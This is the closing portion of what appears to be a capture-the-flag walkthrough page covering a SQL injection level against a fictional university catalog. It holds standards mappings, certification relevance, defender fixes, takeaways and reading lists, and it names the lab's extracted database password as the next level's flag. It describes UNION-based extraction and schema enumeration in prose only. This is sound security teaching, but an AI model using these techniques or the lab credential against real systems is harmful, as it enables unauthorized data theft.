+<p><strong>CWE-312 / CWE-522: Cleartext Storage of Sensitive Information / Insufficiently Protected Credentials.</strong> The <code>meridian_dbadmin</code> password stored in plaintext in <code>app_config</code>. (<a href="https://cwe.mitre.org/data/definitions/312.html" target="_blank" rel="noopener noreferrer">MITRE CWE-312</a>, <a href="https://cwe.mitre.org/data/definitions/522.html" target="_blank" rel="noopener noreferrer">CWE-522</a>)</p>
+<p><strong>OWASP Top 10:2025 — A05 Injection.</strong> The umbrella category. Injection is A05 in the 2025 edition, down from A03:2021 (and from the #1 slot in the 2013 and 2017 editions). The decline reflects the industry-wide adoption of parameterized queries and ORMs — not that the bug is solved. (<a href="https://owasp.org/Top10/" target="_blank" rel="noopener noreferrer">OWASP Top 10:2025</a>)</p>
+<p><strong>OWASP SQL Injection Prevention Cheat Sheet.</strong> The single most-cited defender reference. Its primary defense is &quot;use of prepared statements (with parameterized queries)&quot;; secondary defenses are stored procedures, allow-list input validation, and escaping (in that priority order). (<a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener noreferrer">OWASP Cheat Sheet Series — SQL Injection Prevention</a>)</p>
+<p><strong>OWASP Web Security Testing Guide (WSTG).</strong> The offensive-side reference: WSTG-INPV-05 (Testing for SQL Injection) documents the exact methodology this level walks — error-based probing, UNION-based extraction, <code>information_schema</code> enumeration. (<a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank" rel="noopener noreferrer">OWASP WSTG</a>)</p>
+<p><strong>NIST SP 800-53 Rev. 5.</strong></p>
+<ul>
+<li><strong>SI-10 (Information Input Validation)</strong> — the control directly addressing injection: validate/neutralize input before it reaches an interpreter.</li>
+<li><strong>SI-11 (Error Handling)</strong> — reveal as little as possible in error messages; the verbose error violates this directly.</li>
+<li><strong>AC-6 (Least Privilege)</strong> — the catalog&#39;s database account had far more access than its function required.</li>
+</ul>
+<p>(<a href="https://csrc.nist.gov/pubs/sp/800/53/r5/upd1/final" target="_blank" rel="noopener noreferrer">NIST SP 800-53 Rev. 5</a>)</p>
+<p><strong>CIS Critical Security Controls v8.1.</strong> Control 16 (Application Software Security) is the home control — specifically <strong>16.11 (Leverage Vetted Modules or Services for Application Security Components)</strong>: use the framework&#39;s parameterized-query API rather than hand-building SQL. Control 3 (Data Protection) covers the plaintext credential. (<a href="https://www.cisecurity.org/controls/cis-controls-list" target="_blank" rel="noopener noreferrer">CIS Controls</a>)</p>
+<p><strong>FERPA (20 U.S.C. § 1232g; 34 CFR Part 99).</strong> The <code>students</code> table reachable through this injection is exactly the &quot;education records&quot; FERPA governs. §99.31 (conditions for disclosure of PII from education records) and §99.32 (recordkeeping for disclosures) are both failed: an injection-driven disclosure to an unknown party has no consent and no audit trail. FERPA&#39;s enforcement mechanism — withdrawal of federal funding — is existential for a public university, which is why this finding goes to the general counsel the same day. (<a href="https://studentprivacy.ed.gov/ferpa" target="_blank" rel="noopener noreferrer">U.S. Dept. of Education — Student Privacy / FERPA</a>)</p>
+<p><strong>PortSwigger Web Security Academy — SQL injection.</strong> The best free hands-on learning resource for this exact technique, including UNION attacks and <code>information_schema</code> enumeration, with interactive labs. (<a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener noreferrer">PortSwigger — SQL injection</a>)</p>
+<h2 id="certifications">§6 — Cert exam relevance<a class="anchor" href="#certifications" aria-label="Link to this section">#</a></h2>
+<p><strong>CompTIA Security+ (SY0-701).</strong> Domain 2 (Threats, Vulnerabilities, and Mitigations) names injection attacks directly, and Domain 4 covers input validation and secure coding as mitigations. (<a href="https://www.comptia.org/en-us/certifications/security/" target="_blank" rel="noopener noreferrer">CompTIA Security+</a>)</p>
+<p><strong>CompTIA PenTest+ (PT0-003).</strong> Domain 3 (Attacks and Exploits) covers SQL injection, UNION-based extraction, and <code>information_schema</code> enumeration; Domain 2 (Reconnaissance and Enumeration) covers the web-app testing that finds the injectable parameter. <code>sqlmap</code> is named tooling.</p>
+<p><strong>CompTIA CySA+ (CS0-003 / CS0-004).</strong> CS0-004 launched in early 2026 for parallel availability; CS0-003 retires June 2026. Injection-detection patterns appear in the threat-hunting and log-analysis modules — the SIEM signature for SQLi (anomalous query strings, error spikes) is on the exam.</p>
+<p><strong>(ISC)² CISSP.</strong> Domain 8 (Software Development Security) — input validation, parameterized queries, and the secure-SDLC controls that catch this class are fundamentals.</p>
+<p><strong>Offensive Security OSWA / OSWE / OSCP.</strong> SQL injection is a core skill across all three. The <strong>OSWA (Web Assessor)</strong> and <strong>OSWE (Web Expert)</strong> exams test exactly this hand-built UNION-extraction workflow; OSCP includes SQLi as a web-app foothold technique. (<a href="https://www.offsec.com/courses-and-certifications/" target="_blank" rel="noopener noreferrer">OffSec certifications</a>)</p>
+<p><strong>EC-Council CEH v13.</strong> Module 15 (SQL Injection) is a dedicated module covering error-based, UNION-based, and blind SQLi plus <code>sqlmap</code> automation.</p>
+<h2 id="defender">§7 — What a defender does<a class="anchor" href="#defender" aria-label="Link to this section">#</a></h2>
+<p><strong>Parameterize the query.</strong> This is the fix — not a mitigation, the fix. Prepared statements / bound parameters on every query, no exceptions. Every modern framework makes this the default path: parameterized queries in <code>mysql2</code>/<code>pg</code>/<code>better-sqlite3</code> for Node, the Django/Rails/Laravel/Spring ORMs, <code>PreparedStatement</code> in JDBC, parameterized <code>cursor.execute(sql, params)</code> in Python&#39;s DB-API. The opt-out (string concatenation) requires more code than the opt-in. There is no legitimate reason to build a query by concatenation in 2026.</p>
+<p><strong>Scope the database account to least privilege.</strong> The public catalog needs <code>SELECT</code> on <code>courses</code> and nothing else. A read-only account scoped to one table turns even a successful injection into a non-event. Treat every application&#39;s database credential as needing the minimum grant that lets the application function — never the schema-wide read/write BluePier configured.</p>
+<p><strong>Stop returning errors to clients.</strong> Return a generic 500 with a correlation ID; log the detail server-side. Never echo the query, the DB version, or the stack trace to an HTTP response. This closes CWE-209 and removes the attacker&#39;s feedback loop.</p>
+<p><strong>Rotate the exposed credential and move it out of the database.</strong> Treat <code>meridian_dbadmin</code> / <code>M3rid14n-DBr00t!2026</code> as burned the moment it appeared in a query response. Rotate it, then move it into a secrets manager (<a href="https://docs.aws.amazon.com/secretsmanager/latest/userguide/intro.html" target="_blank" rel="noopener noreferrer">AWS Secrets Manager</a>, <a href="https://developer.hashicorp.com/vault/docs/secrets" target="_blank" rel="noopener noreferrer">HashiCorp Vault</a>, <a href="https://cloud.google.com/secret-manager/docs" target="_blank" rel="noopener noreferrer">GCP Secret Manager</a>, <a href="https://learn.microsoft.com/en-us/azure/key-vault/general/overview" target="_blank" rel="noopener noreferrer">Azure Key Vault</a>). Credentials never belong in a database row an injection can read.</p>
+<p><strong>Put the subdomain behind the WAF and add rate limiting.</strong> A WAF is <em>not</em> a fix for injection — parameterizing is — but it raises the cost of automated discovery (sqlmap is noisy) and rate limiting bounds bulk extraction. Defense in depth, layered on top of the real fix, never instead of it.</p>
+<p><strong>Upgrade off MySQL 5.7.</strong> It reached <a href="https://endoflife.date/mysql" target="_blank" rel="noopener noreferrer">end-of-life October 31, 2023</a>; an unpatched database under a public injection is a compounding risk. Upgrade to a supported MySQL 8.x.</p>
+<p><strong>Scan for the pattern in CI.</strong> The &quot;glue input into SQL&quot; shape repeats across a codebase. <a href="https://semgrep.dev/" target="_blank" rel="noopener noreferrer">Semgrep</a> and <a href="https://codeql.github.com/" target="_blank" rel="noopener noreferrer">CodeQL</a> both ship SQL-injection rule packs that flag string-concatenated queries at the pull-request gate. Find every query built by concatenation, not just this one — and add a lint rule that fails the build on new ones.</p>
+<h2 id="optional-exploration">§7.5 — Optional exploration<a class="anchor" href="#optional-exploration" aria-label="Link to this section">#</a></h2>
+<p>Both bonus finds surface the conditions that made the injection worse than it had to be.</p>
+<p><strong>Bonus find — Verbose database errors in production (CWE-209).</strong> Triggered by the single-quote probe in Step 4. The endpoint returned the raw MySQL error <em>and</em> the exact SQL it tried to run. On its own a verbose error is &quot;only&quot; an information leak, but for an attacker developing a SQLi payload it&#39;s the difference between blind guessing and a guided exercise: it confirms the backend (MySQL), reveals the query template, and reads your injection back to you. The fix is decoupled from the injection fix — even a fully parameterized app should return generic client errors and log detail server-side. This is the lesson behind the rule &quot;error messages are for your logs, not your users.&quot;</p>
+<p><strong>Bonus find — Public endpoint with no WAF and no rate limiting.</strong> Surfaced in <code>deploy-notes.md</code>. The catalog subdomain was stood up on a separate origin that BluePier never put behind the Cloudflare WAF that fronts the main site, and there&#39;s no rate limit on <code>/api/search</code>. A WAF wouldn&#39;t have <em>fixed</em> the injection (parameterizing does that), but its absence means an attacker — or an automated tool like sqlmap — can hammer the endpoint and the database directly, unthrottled, with no signature-based detection in front. The finding is a reminder that security controls applied to the &quot;main&quot; site don&#39;t automatically extend to every subdomain; each new origin needs the same baseline.</p>
+<h2 id="takeaways">§8 — Key takeaways<a class="anchor" href="#takeaways" aria-label="Link to this section">#</a></h2>
+<ol>
+<li><p><strong>String-concatenated SQL is the whole bug.</strong> <code>&quot;...LIKE &#39;%&quot; + q + &quot;%&#39;&quot;</code> is the one line everything in §2 follows from. The fix is parameterized queries / prepared statements — the input is sent to the database separately from the query, so it can never become code.</p>
+</li>
+<li><p><strong>Parameterization is the fix, not a mitigation.</strong> Input validation, escaping, and WAFs are defense in depth layered <em>on top</em> of parameterization — never instead of it. A bound parameter makes the bug class structurally impossible.</p>
+</li>
+<li><p><strong>Verbose errors turn blind guessing into guided extraction.</strong> The leaked query and DB version (CWE-209) are a separate finding with a separate fix: generic client errors, detail in server logs only.</p>
+</li>
+<li><p><strong>Least privilege bounds the blast radius.</strong> The catalog connecting with schema-wide read/write (CWE-250) is the difference between &quot;one table leaked&quot; and &quot;every FERPA record leaked.&quot; A read-only account scoped to <code>courses</code> turns a catastrophic injection into a nuisance.</p>
+</li>
+<li><p><strong>Credentials never belong in a database row.</strong> The plaintext <code>meridian_dbadmin</code> password in <code>app_config</code> (CWE-312/522) is reachable by exactly the injection that the credential&#39;s own database is vulnerable to. Secrets managers exist to eliminate this pattern.</p>
+</li>
+<li><p><strong>Injection&#39;s prevalence fell; its impact didn&#39;t.</strong> It dropped to A05:2025 because parameterization is now the framework default — but MOVEit (2023) stole data from thousands of organizations through one SQLi. &quot;Less common&quot; is not &quot;gone,&quot; especially in inherited 2021 code on an un-reviewed subdomain.</p>
+</li>
+<li><p><strong>For Meridian, this is a FERPA matter, today.</strong> Every student record was reachable from the open internet through a public search box. FERPA&#39;s enforcement mechanism is loss of federal funding; the general counsel and Cedarwood Mutual both need this finding the same day, framed — as TalkTalk&#39;s regulator framed it — around its preventability.</p>
+</li>
+</ol>
+<p>The level3 credential — <strong><code>M3rid14n-DBr00t!2026</code></strong> — is the <code>meridian_dbadmin</code> database-superuser password, extracted in plaintext from the <code>app_config</code> table via the UNION injection. The breadcrumb isn&#39;t a leaked file this time; it&#39;s the <em>finding</em> — the application&#39;s own master database credential, reachable from a public search box, stored where an injection could read it.</p>
+<h2 id="further-reading">§9 — Further reading<a class="anchor" href="#further-reading" aria-label="Link to this section">#</a></h2>
+<p><em>Last reviewed: May 2026. External standards versions and incident facts verified against current canonical sources as of this date. Report stale links via the project&#39;s GitHub issues tracker.</em></p>
+<p><strong>SQL injection — learn + prevent</strong></p>
+<ul>
+<li><a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener noreferrer">PortSwigger Web Security Academy — SQL injection</a> — the best free hands-on labs, including UNION attacks and information_schema enumeration.</li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener noreferrer">OWASP SQL Injection Prevention Cheat Sheet</a> — the canonical defender reference; prepared statements first.</li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank" rel="noopener noreferrer">OWASP Web Security Testing Guide — Testing for SQL Injection</a> — the offensive methodology (WSTG-INPV-05).</li>
+<li><a href="https://owasp.org/Top10/" target="_blank" rel="noopener noreferrer">OWASP Top 10:2025</a> — A05 Injection.</li>
+<li><a href="https://sqlmap.org/" target="_blank" rel="noopener noreferrer">sqlmap</a> — the tool that automates the entire §2 sequence; understanding it by hand first is the point of this level.</li>
+</ul>
+<p><strong>Real-world cases</strong></p>
+<ul>
+<li>Heartland Payment Systems 2008 — <a href="https://en.wikipedia.org/wiki/Albert_Gonzalez" target="_blank" rel="noopener noreferrer">Albert Gonzalez (SQLi methodology)</a>; <a href="https://en.wikipedia.org/wiki/Heartland_Payment_Systems#Security_breach" target="_blank" rel="noopener noreferrer">Heartland breach scope</a>.</li>
+<li>Sony Pictures / LulzSec 2011 — <a href="https://en.wikipedia.org/wiki/LulzSec" target="_blank" rel="noopener noreferrer">Wikipedia (LulzSec)</a>.</li>
+<li>TalkTalk 2015 — <a href="https://ico.org.uk/about-the-ico/media-centre/talktalk-cyber-attack-how-the-ico-investigation-unfolded/" target="_blank" rel="noopener noreferrer">ICO investigation account</a>.</li>
+<li>MOVEit Transfer 2023 (CVE-2023-34362) — <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-34362" target="_blank" rel="noopener noreferrer">NVD entry</a>; <a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a" target="_blank" rel="noopener noreferrer">CISA advisory AA23-158A</a>.</li>
+</ul>
+<p><strong>Frameworks + standards</strong></p>
+<ul>
+<li><a href="https://csrc.nist.gov/pubs/sp/800/53/r5/upd1/final" target="_blank" rel="noopener noreferrer">NIST SP 800-53 Rev. 5</a> — SI-10 (Input Validation), SI-11 (Error Handling), AC-6 (Least Privilege).</li>
+<li><a href="https://www.cisecurity.org/controls/cis-controls-list" target="_blank" rel="noopener noreferrer">CIS Critical Security Controls v8.1</a> — Control 16 (Application Software Security), Control 3 (Data Protection).</li>
+<li><a href="https://studentprivacy.ed.gov/ferpa" target="_blank" rel="noopener noreferrer">U.S. Dept. of Education — FERPA</a> — 20 U.S.C. § 1232g; 34 CFR Part 99.</li>
+</ul>
+<p><strong>Secrets management + SAST</strong></p>
+<ul>
+<li><a href="https://docs.aws.amazon.com/secretsmanager/latest/userguide/intro.html" target="_blank" rel="noopener noreferrer">AWS Secrets Manager</a> · <a href="https://developer.hashicorp.com/vault/docs/secrets" target="_blank" rel="noopener noreferrer">HashiCorp Vault</a> · <a href="https://cloud.google.com/secret-manager/docs" target="_blank" rel="noopener noreferrer">GCP Secret Manager</a> · <a href="https://learn.microsoft.com/en-us/azure/key-vault/general/overview" target="_blank" rel="noopener noreferrer">Azure Key Vault</a>.</li>
+<li><a href="https://semgrep.dev/" target="_blank" rel="noopener noreferrer">Semgrep</a> · <a href="https://codeql.github.com/" target="_blank" rel="noopener noreferrer">CodeQL</a> — SAST tools with SQL-injection rule packs for the CI gate.</li>
+</ul>
+<p><strong>MITRE ATT&amp;CK references</strong></p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1190/" target="_blank" rel="noopener noreferrer">T1190 — Exploit Public-Facing Application</a>.</li>
+<li><a href="https://attack.mitre.org/techniques/T1213/" target="_blank" rel="noopener noreferrer">T1213 — Data from Information Repositories</a>.</li>
+<li><a href="https://attack.mitre.org/techniques/T1552/" target="_blank" rel="noopener noreferrer">T1552 — Unsecured Credentials</a>.</li>
+<li><a href="https://attack.mitre.org/techniques/T1078/" target="_blank" rel="noopener noreferrer">T1078 — Valid Accounts</a>.</li>
+</ul>
+<p><strong>CWE catalog</strong></p>
+<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/89.html" target="_blank" rel="noopener noreferrer">CWE-89 — SQL Injection</a>.</li>
+<li><a href="https://cwe.mitre.org/data/definitions/209.html" target="_blank" rel="noopener noreferrer">CWE-209 — Error Message Containing Sensitive Information</a>.</li>
+<li><a href="https://cwe.mitre.org/data/definitions/250.html" target="_blank" rel="noopener noreferrer">CWE-250 — Execution with Unnecessary Privileges</a>.</li>
+<li><a href="https://cwe.mitre.org/data/definitions/312.html" target="_blank" rel="noopener noreferrer">CWE-312 — Cleartext Storage of Sensitive Information</a>.</li>
+<li><a href="https://cwe.mitre.org/data/definitions/522.html" target="_blank" rel="noopener noreferrer">CWE-522 — Insufficiently Protected Credentials</a>.</li>
+</ul>
+<nav class="pager" aria-label="Walkthrough navigation"><a class="pager-cell pager-prev" href="/walkthroughs/web/level1.html"><span class="pager-dir">&larr; Previous</span><span class="pager-label">level1@web</span><span class="pager-title">Carlos's Login Wall</span></a><div class="pager-cell pager-empty"></div></nav>    </main>
+    <aside class="rail"><nav class="toc" id="toc" aria-label="On this page"><p class="toc-title">On this page</p><ul class="toc-list"><li data-section="setup"><a href="#setup"><span class="toc-ord">§1</span><span class="toc-label">The setup</span></a></li><li data-section="solve"><a href="#solve"><span class="toc-ord">§2</span><span class="toc-label">The solve</span></a><ul class="toc-sub"><li><a href="#step-1-use-the-breadcrumb-to-enter-the-box">Step 1: Use the breadcrumb to enter the box</a></li><li><a href="#step-2-read-the-brief-and-the-vulnerable-source">Step 2: Read the brief and the vulnerable source</a></li><li><a href="#step-3-watch-the-endpoint-behave-normally">Step 3: Watch the endpoint behave normally</a></li><li><a href="#step-4-probe-with-a-single-quote-cwe-209-bonus">Step 4: Probe with a single quote (CWE-209 bonus)</a></li><li><a href="#step-5-confirm-with-a-tautology">Step 5: Confirm with a tautology</a></li><li><a href="#step-6-count-the-columns">Step 6: Count the columns</a></li><li><a href="#step-7-fingerprint-the-database">Step 7: Fingerprint the database</a></li><li><a href="#step-8-enumerate-the-schema-via-information-schema">Step 8: Enumerate the schema via information_schema</a></li><li><a href="#step-9-dump-app-config-the-credential-the-level3-breadcrumb">Step 9: Dump app_config — the credential (the level3 breadcrumb)</a></li><li><a href="#step-10-demonstrate-the-ferpa-blast-radius-then-stop">Step 10: Demonstrate the FERPA blast radius (then stop)</a></li><li><a href="#step-11-return-to-the-lobby-with-the-finding">Step 11: Return to the lobby with the finding</a></li></ul></li><li data-section="vulnerability"><a href="#vulnerability"><span class="toc-ord">§3</span><span class="toc-label">The vulnerability</span></a></li><li data-section="real-world-parallels"><a href="#real-world-parallels"><span class="toc-ord">§4</span><span class="toc-label">Real-world parallels</span></a></li><li data-section="frameworks"><a href="#frameworks"><span class="toc-ord">§5</span><span class="toc-label">Frameworks</span></a></li><li data-section="certifications"><a href="#certifications"><span class="toc-ord">§6</span><span class="toc-label">Cert exam relevance</span></a></li><li data-section="defender"><a href="#defender"><span class="toc-ord">§7</span><span class="toc-label">What a defender does</span></a></li><li data-section="optional-exploration"><a href="#optional-exploration"><span class="toc-ord">§7.5</span><span class="toc-label">Optional exploration</span></a></li><li data-section="takeaways"><a href="#takeaways"><span class="toc-ord">§8</span><span class="toc-label">Key takeaways</span></a></li><li data-section="further-reading"><a href="#further-reading"><span class="toc-ord">§9</span><span class="toc-label">Further reading</span></a></li></ul><a class="toc-top" href="#main">Back to top</a></nav></aside>
+  </div>
+
+  <footer id="site-footer">
+    <p class="footer-disclaimer">
+      For educational use. Don't run these techniques against systems
+      you don't own or aren't authorized to test.
+    </p>
+    <p class="footer-links">
+      <a href="/" class="footer-link">&larr; Back to d3cyph3r.com</a>
+      <span class="footer-sep" aria-hidden="true">&middot;</span>
+      <a href="https://github.com/rlwilliamson-dev/d3cyph3r" target="_blank" rel="noopener noreferrer" class="footer-link" aria-label="View source on GitHub">
+        <svg width="13" height="13" viewBox="0 0 16 16" aria-hidden="true" fill="currentColor">
+          <path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82a7.62 7.62 0 0 0-2-.27c-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/>
+        </svg>
+        <span>Source on GitHub</span>
+      </a>
+      <span class="footer-sep" aria-hidden="true">&middot;</span>
+      <a href="https://azure.microsoft.com/" target="_blank" rel="noopener noreferrer" class="footer-link" aria-label="Hosted on Microsoft Azure">
+        <svg width="13" height="13" viewBox="0 0 18 18" aria-hidden="true">
+          <path d="M10.61 2L4.05 14.4l5.6.04 1.5-2.92 4.9 2.88L10.61 2z" fill="#0078D4"/>
+        </svg>
+        <span>Hosted on Microsoft Azure</span>
+      </a>
+    </p>
+  </footer>
+
+  <script type="module" src="/walkthroughs/reader.js"></script>
+</body>
+</html>
